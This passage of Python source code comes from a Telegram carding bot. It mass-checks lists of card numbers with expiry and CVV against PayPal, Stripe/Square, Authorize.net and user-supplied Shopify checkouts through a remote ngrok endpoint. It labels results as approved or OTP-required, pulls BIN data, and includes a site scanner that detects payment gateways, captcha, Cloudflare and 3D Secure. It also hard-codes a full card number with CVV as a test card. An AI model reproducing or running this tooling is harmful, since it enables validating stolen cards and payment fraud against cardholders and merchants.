                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mpy command
@bot.message_handler(commands=['mpy'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mpy'))
def handle_mpy(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass PayPal check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Paypal [0.1$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_paypal_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', 'Paypal [0.1$]')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass PayPal check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mqq command
@bot.message_handler(commands=['mqq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mqq'))
def handle_mqq(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Stripe Square check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Stripe Square [0.20$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_qq_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', 'Stripe Square [0.20$]')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass Stripe Square check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mcc command
@bot.message_handler(commands=['mcc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mcc'))
def handle_mcc(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Site Based check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Site Based [1$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = process_cc_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', 'Site Based [1$]')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass Site Based check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /at command
@bot.message_handler(commands=['at'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.at'))
def handle_at(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Authnet [5$]", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = process_card_at(cc)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /mat command
@bot.message_handler(commands=['mat'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mat'))
def handle_mat(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass AT check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        try:
            first_card_result = process_card_at(cards[0])
            gateway = first_card_result.get("gateway", "Authnet [5$]")
        except:
            gateway = "Authnet [5$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    future_to_card = {executor.submit(process_card_at, card): card for card in cards}
                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
                        card = future_to_card[future]
                        try:
                            result = future.result()
                            results.append({
                                'card': card,
                                'status': result['status'],
                                'response': result['response'],
                                'gateway': result.get('gateway', 'Authnet [5$]')
                            })
                        except Exception as e:
                            results.append({
                                'card': card,
                                'status': 'ERROR',
                                'response': f'Error: {str(e)}',
                                'gateway': gateway
                            })

                        current_time = time.time() - start_time
                        progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_message.message_id,
                            text=progress_msg,
                            parse_mode='HTML'
                        )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass AT check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def test_shopify_site(url):
    """Test if a Shopify site is reachable and working with a test card"""
    try:
        # Use the fixed test card instead of generating random one
        test_card = "5547300001996183|11|2028|197"
        
        api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={test_card}&site={url}"
        response = requests.get(api_url, timeout=30)
        
        if response.status_code != 200:
            return False, "Site not reachable", "0.0", "shopify_payments", "No response"
            
        response_text = response.text
        
        # Parse response
        price = "1.0"  # default
        gateway = "shopify_payments"  # default
        api_message = "No response"
        
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
            if '"Gateway":"' in response_text:
                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
        except:
            pass
            
        return True, api_message, price, gateway, "Site is reachable and working"
        
    except Exception as e:
        return False, f"Error testing site: {str(e)}", "0.0", "shopify_payments", "Error"

@bot.message_handler(commands=['seturl'])
def handle_seturl(message):
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /seturl <your_shopify_site_url>")
            return
            
        url = parts[1].strip()
        
        # Validate URL format
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        # Check if URL is valid Shopify site
        status_msg = bot.reply_to(message, f"🔄 Adding URL: <code>{url}</code>\nTesting reachability...", parse_mode='HTML')
        
        # Phase 1: Basic URL check
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Invalid URL format: {str(e)}")
            return
            
        # Phase 2: Test reachability
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"🔄 Testing URL: <code>{url}</code>\nTesting with test card...",
                            parse_mode='HTML')
        
        # Phase 3: Test with test card
        is_valid, api_message, price, gateway, test_message = test_shopify_site(url)
        if not is_valid:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Failed to verify Shopify site:\n{test_message}\nPlease check your URL and try again.")
            return
            
        # Store the URL with price
        USER_SITES[user_id] = {
            'url': url,
            'price': price
        }
        save_user_sites()
        
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"""
┏━━━━━━━⍟
┃ 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 ✅
┗━━━━━━━━━━━⊛
                            
<a href='https://t.me/backyXchannel'>[⸙]</a>❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
<a href='https://t.me/backyXchannel'>[⸙]</a>❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {api_message}
<a href='https://t.me/backyXchannel'>[⸙]</a>❖ 𝗔𝗺𝗼𝘂𝗻𝘁 ➳ ${price}

<i>You can now check cards with /sh command</i>
─────── ⸙ ────────
""",
                            parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['rmurl'])
def handle_rmurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES:
            bot.reply_to(message, "You don't have any site to remove. Add a site with /seturl")
            return
            
        del USER_SITES[user_id]
        save_user_sites()
        bot.reply_to(message, "✅ Your Shopify site has been removed successfully.")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['myurl'])
def handle_myurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES:
            bot.reply_to(message, "You haven't added any site yet. Add a site with /seturl <your_shopify_url>")
            return
            
        site_info = USER_SITES[user_id]
        bot.reply_to(message, f"""Your Shopify site details:

URL: <code>{site_info['url']}</code>
Default Amount: ${site_info.get('price', '1.0')}

Use /sh command to check cards""", parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def check_shopify_cc(cc, site_info):
    try:
        # Normalize card input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [x.strip() for x in card.split('|') if x.strip()]
        
        if len(parts) < 4:
            return {
                'status': 'ERROR', 
                'card': cc, 
                'message': 'Invalid format',
                'brand': 'UNKNOWN', 
                'country': 'UNKNOWN 🇺🇳', 
                'type': 'UNKNOWN',
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        cc_num, mm, yy_raw, cvv = parts[:4]
        mm = mm.zfill(2)
        yy = yy_raw[2:] if yy_raw.startswith("20") and len(yy_raw) == 4 else yy_raw
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # Get BIN info
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🇺🇳'
        try:
            bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
            brand = bin_data.get('brand', 'UNKNOWN')
            country_name = bin_data.get('country_name', 'UNKNOWN')
            country_flag = bin_data.get('country_flag', '🇺🇳')
            card_type = bin_data.get('type', 'UNKNOWN')
            bank = bin_data.get('bank', 'UNKNOWN')
        except:
            pass

        # Make API request
        api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={formatted_cc}&site={site_info['url']}"
        response = requests.get(api_url, timeout=30)
        
        if response.status_code != 200:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f'API Error: {response.status_code}',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        # Parse response text
        response_text = response.text
        
        # Default values
        api_message = 'No response'
        price = site_info.get('price', '1.0')
        gateway = 'shopify_payments'
        status = 'DECLINED'
        
        # Extract data from response text
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
                
                # Process response according to new rules
                response_upper = api_message.upper()
                if 'THANK YOU' in response_upper:
                    bot_response = 'ORDER CONFIRM!'
                    status = 'APPROVED'
                elif '3DS' in response_upper:
                    bot_response = 'OTP_REQUIRED'
                    status = 'APPROVED_OTP'
                elif 'EXPIRED_CARD' in response_upper:
                    bot_response = 'EXPIRE_CARD'
                    status = 'EXPIRED'
                elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
                    bot_response = api_message
                    status = 'APPROVED_OTP'
                else:
                    bot_response = api_message
            else:
                bot_response = api_message
                
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
            if '"Gateway":"' in response_text:
                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
        except Exception as e:
            bot_response = f"Error parsing response: {str(e)}"
        
        return {
            'status': status,
            'card': formatted_cc,
            'message': bot_response,
            'brand': brand,
            'country': f"{country_name} {country_flag}",
            'type': card_type,
            'gateway': f"Self Shopify [${price}]",
            'price': price
        }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Exception: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🇺🇳',
            'type': 'UNKNOWN',
            'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
            'price': site_info.get('price', '1.0')
        }

def format_shopify_response(result, user_full_name, processing_time):
    user_id_str = str(result.get('user_id', ''))
    
    # Determine user status
    if user_id_str == "7098912960":
        user_status = "Owner"
    elif user_id_str in ADMIN_IDS:
        user_status = "Admin"
  
    else:
        user_status = "Free"

    response = f"""
<a href='https://t.me/backyXchannel'>┏━━━━━━━⍟</a>
<a href='https://t.me/backyXchannel'>┃ {status_text[result['status']]} {status_emoji[result['status']]}</a>
<a href='https://t.me/backyXchannel'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/backyXchannel'>[⸙]</a> 𝗖𝗮𝗿𝗱
   ↳ <code>{result['card']}</code>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>  
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{result['message']}</i>
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {result['brand']}
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐁𝐚𝐧𝐤 ⌁ {result['type']}
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
<a href='https://t.me/backyXchannel'>──────── ⸙ ─────────</a>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {user_full_name}[{user_status}]
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝐃𝐞𝐯 ⌁ <a href='tg://user?id=6521162324'>⎯꯭𖣐᪵‌𐎓⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲◄⏤‌‌ꭙ‌‌⁷ ꯭</a>
<a href='https://t.me/backyXchannel'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁  {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""
    return response

@bot.message_handler(commands=['sh'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sh'))
def handle_sh(message):
    user_id = str(message.from_user.id)
    
    # Check if user has set a URL first
    if user_id not in USER_SITES:
        bot.reply_to(message, "❌ You haven't added any site yet. Add a site with /seturl <your_shopify_url>\nUse /myurl to view your site details")
        return
    
    # Check credits
    if not use_credits(int(user_id)):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    try:
        # Extract card from either format
        cc = None
        
        # Check if command is empty (either '/sh' or '.sh' without arguments)
        if (message.text.startswith('/sh') and len(message.text.split()) == 1) or \
           (message.text.startswith('.sh') and len(message.text.strip()) == 3):
            
            # Check if this is a reply to another message
            if message.reply_to_message:
                # Search for CC in replied message text
                replied_text = message.reply_to_message.text
                # Try to find CC in common formats
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    # Clean the CC (remove spaces and dashes)
                    cc = matches[0].replace(' ', '').replace('-', '')
                    # Check if we have full card details (number|mm|yyyy|cvv)
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            # Normal processing for commands with arguments
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Invalid format. Use /sh CC|MM|YYYY|CVV or .sh CC|MM|YYYY|CVV")
                    return
                cc = parts[1]
            else:  # starts with .
                cc = message.text[4:].strip()  # remove ".sh "

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        # Get bin info for the checking status message
        bin_number = cc.split('|')[0][:6]
        bin_info = get_bin_info(bin_number) or {}
        brand = bin_info.get('brand', 'UNKNOWN')
        card_type = bin_info.get('type', 'UNKNOWN')
        country = bin_info.get('country', 'UNKNOWN')
        country_flag = bin_info.get('country_flag', '🇺🇳')

        status_msg = bot.reply_to(
            message,
            f"""
<a href='https://t.me/voidboy336'>┏━━━━━━━⍟</a>
<a href='https://t.me/voidboy336'>┃ ↯ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠</a>
<a href='https://t.me/voidboy336'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/voidboy336'>[⸙]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{cc}</code>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>Self Shopify [${USER_SITES[user_id].get('price', '1.0')}]</i>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>Processing</i>
<a href='https://t.me/voidboy336'>──────── ⸙ ─────────</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {brand}
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐓𝐲𝐩𝐞 ⌁ {card_type}
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {country} {country_flag}
<a href='https://t.me/voidboy336'>──────── ⸙ ─────────</a>
            """,
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_shopify_cc(cc, USER_SITES[user_id])
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_shopify_response(result, user_full_name, processing_time)

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=response_text,
                    parse_mode='HTML'
                )

            except Exception as e:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ An error occurred: {str(e)}"
                )

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle /gate command
def check_gate_url(url):
    try:
        def normalize_url(url):
            url = url.strip()
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            return url

        def is_valid_url(url):
            try:
                url = normalize_url(url)
                regex = re.compile(
                    r'^(?:http|ftp)s?://'
                    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
                    r'localhost|'
                    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
                    r'\[?[A-F0-9]*:[A-Z0-9:]+\]?)'
                    r'(?::\d+)?'
                    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
                return re.match(regex, url) is not None
            except:
                return False

        def find_payment_gateways(response_text):
            gateways = [
                "paypal", "stripe", "braintree", "square", "cybersource", "authorize.net", "2checkout",
                "adyen", "worldpay", "sagepay", "checkout.com", "shopify", "razorpay", "bolt", "paytm",
                "venmo", "pay.google.com", "revolut", "eway", "woocommerce", "upi", "apple.com", "payflow",
                "payeezy", "paddle", "payoneer", "recurly", "klarna", "paysafe", "webmoney", "payeer",
                "payu", "skrill", "affirm", "afterpay", "dwolla", "global payments", "moneris", "nmi",
                "payment cloud", "paysimple", "paytrace", "stax", "alipay", "bluepay", "paymentcloud",
                "clover", "zelle", "google pay", "cashapp", "wechat pay", "transferwise", "stripe connect",
                "mollie", "sezzle", "payza", "gocardless", "bitpay", "sureship", "conekta",
                "fatture in cloud", "payzaar", "securionpay", "paylike", "nexi", "forte", "worldline", "payu latam"
            ]
            return [g.capitalize() for g in gateways if g in response_text.lower()]

        def check_captcha(response_text):
            keywords = {
                'recaptcha': ['recaptcha', 'google recaptcha'],
                'image selection': ['click images', 'identify objects', 'select all'],
                'text-based': ['enter the characters', 'type the text', 'solve the puzzle'],
                'verification': ['prove you are not a robot', 'human verification', 'bot check'],
                'hcaptcha': [
                    'hcaptcha', 'verify you are human', 'select images', 'cloudflare challenge',
                    'anti-bot verification', 'hcaptcha.com', 'hcaptcha-widget'
                ]
            }
            detected = []
            for typ, keys in keywords.items():
                for key in keys:
                    if re.search(rf'\b{re.escape(key)}\b', response_text, re.IGNORECASE):
                        if typ not in detected:
                            detected.append(typ)
            if re.search(r'<iframe.*?src=".*?hcaptcha.*?".*?>', response_text, re.IGNORECASE):
                if 'hcaptcha' not in detected:
                    detected.append('hcaptcha')
            return detected if detected else ['No captcha detected']

        def detect_cloudflare(response):
            headers = response.headers
            if 'cf-ray' in headers or 'cloudflare' in headers.get('server', '').lower():
                return "Cloudflare"
            if '__cf_bm' in response.cookies or '__cfduid' in response.cookies:
                return "Cloudflare"
            if 'cf-chl' in response.text.lower() or 'cloudflare challenge' in response.text.lower():
                return "Cloudflare"
            return "None"

        def detect_3d_secure(response_text):
            keywords = [
                "3d secure", "3ds", "3-d secure", "threeds", "acs",
                "authentication required", "secure authentication",
                "secure code", "otp verification", "verified by visa",
                "mastercard securecode", "3dsecure"
            ]
            for keyword in keywords:
                if keyword in response_text.lower():
                    return "3D (3D Secure Enabled)"
            return "2D (No 3D Secure Found)"

        url = normalize_url(url)
        if not is_valid_url(url):
            return {
                "error": "Invalid URL",
                "status": "failed",
                "status_code": 400
            }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Referer': 'https://www.google.com'
        }

        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 403:
            for attempt in range(3):
                time.sleep(2 ** attempt)
                response = requests.get(url, headers=headers, timeout=10)
                if response.status_code != 403:
                    break

        if response.status_code == 403:
            return {
                "error": "403 Forbidden: Access Denied",
                "status": "failed",
                "status_code": 403
            }

        response.raise_for_status()
        detected_gateways = find_payment_gateways(response.text)
        captcha_type = check_captcha(response.text)
        cloudflare_status = detect_cloudflare(response)
        secure_type = detect_3d_secure(response.text)
        cvv_present = "cvv" in response.text.lower() or "cvc" in response.text.lower()
